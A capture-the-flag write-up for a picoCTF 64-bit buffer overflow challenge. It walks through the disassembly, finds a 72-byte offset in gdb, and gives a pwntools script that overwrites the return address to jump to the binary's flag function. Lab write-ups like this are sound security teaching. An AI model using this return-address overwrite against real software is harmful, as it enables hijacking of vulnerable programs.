# **X-Sixty-What - 200 pts**

### Key points

- 64-bit x84 structure
- Buffer overflow

---

## **Contents**

- [Overview](#overview)
- [Solution](#solution)
- [Flag](#flag)

---

## Overview

### Description

> Most problems before this are 32-bit x86. Now we'll consider 64-bit x86 which is a little different! Overflow the buffer and change the return address to the flag function in this program.

---

## Solution

The source code is much like the other buffer overflow challenges. We have a `vuln()` function that takes user input using `gets()`. A function `flag()` reads and prints the flag, but it is never called. We just have to overwrite the return address of `vuln()` to the address of `flag()`.

Use a decompiler/disassembler. I will use objdump.

```
$ objdump -d vuln > vuln.txt
$ cat vuln.txt
...
00000000004012b2 <vuln>:
  4012b2: f3 0f 1e fa     endbr64
  4012b6: 55              push   %rbp
  4012b7: 48 89 e5        mov    %rsp,%rbp
  4012ba: 48 83 ec 40     sub    $0x40,%rsp
  4012be: 48 8d 45 c0     lea    -0x40(%rbp),%rax
  4012c2: 48 89 c7        mov    %rax,%rdi
  4012c5: b8 00 00 00 00  mov    $0x0,%eax
  4012ca: e8 31 fe ff ff  callq  401100 <gets@plt>
  4012cf: 90              nop
  4012d0: c9              leaveq
  4012d1: c3              retq
...
```

The return address of `vuln()` is `0x4012d1`. Open gdb and set a breakpoint there:

...

the `rsp` register points to the return address, so that's what we need to overflow.

Let's find the offset of `rsp`. The buffer size is 64 bytes, so we'll enter a little more than 64.

```
$ gdb vuln
gef>  r
Starting program: /var/www/CanHack/vuln
Welcome to 64-bit. Give me a string that gets you the flag:
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbccccddddeeeeffffgggg

Program received signal SIGSEGV, Segmentation fault.
...
$rsp   : 0x007fffffffe318  â†’  "ddddeeeeffffgggg"
...
```

`rsp` has been overwritten to `ddddeeeeffffgggg`.The offset turns out to be 72, so our payload will be 72 bytes + address of `flag()`.

```
0000000000401236 <flag>:
  401236:       f3 0f 1e fa             endbr64
  40123a:       55                      push   %rbp
  40123b:       48 89 e5                mov    %rsp,%rbp
  40123e:       48 83 ec 50             sub    $0x50,%rsp
```

The second hint suggests we jump to the instruction after the first `push`, so that will be the `mov` instruction at 0x40123b.

---

### The Script

```
from pwn import *

payload = b"a"*72 + p64(0x40123b)

r = remote("saturn.picoctf.net", "60289")
r.sendline(payload)
result = r.recvall()
FLAG = result[result.index("pico"):result.index("}") + 1]
print("Flag:", FLAG)
```

---

## Flag

> `picoCTF{}`
